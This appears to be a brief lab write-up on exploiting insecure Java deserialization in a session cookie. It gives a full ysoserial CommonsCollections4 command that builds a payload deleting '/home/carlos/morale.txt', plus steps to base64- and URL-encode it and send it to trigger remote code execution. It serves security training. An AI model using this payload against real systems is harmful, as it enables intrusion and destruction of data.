# Exploiting Java Deserialization with Apache Web Commons

**Vulnerability Summary:**

Insecure Java deserialization in session cookies allows remote code execution using crafted gadget chains.

**Attack Flow:**

1. **Identify Vector:**
    - Session cookie contains serialized Java object
2. **Generate Payload:**
    - Use ysoserial with CommonsCollections4 gadget chain (see command below)
    - Command: `rm /home/carlos/morale.txt`
    - Base64-encode the serialized payload
3. **Execute Attack:**
    - Replace session cookie with malicious payload
    - URL-encode the entire cookie
    - Send request to trigger deserialization and command execution

```xml
java \
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
 --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
 -jar ./ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

![image.png](Exploiting%20Java%20Deserialization%20with%20Apache%20Web%20Co/image.png)

URL Encode all

![image.png](Exploiting%20Java%20Deserialization%20with%20Apache%20Web%20Co/image%201.png)

![image.png](Exploiting%20Java%20Deserialization%20with%20Apache%20Web%20Co/image%202.png)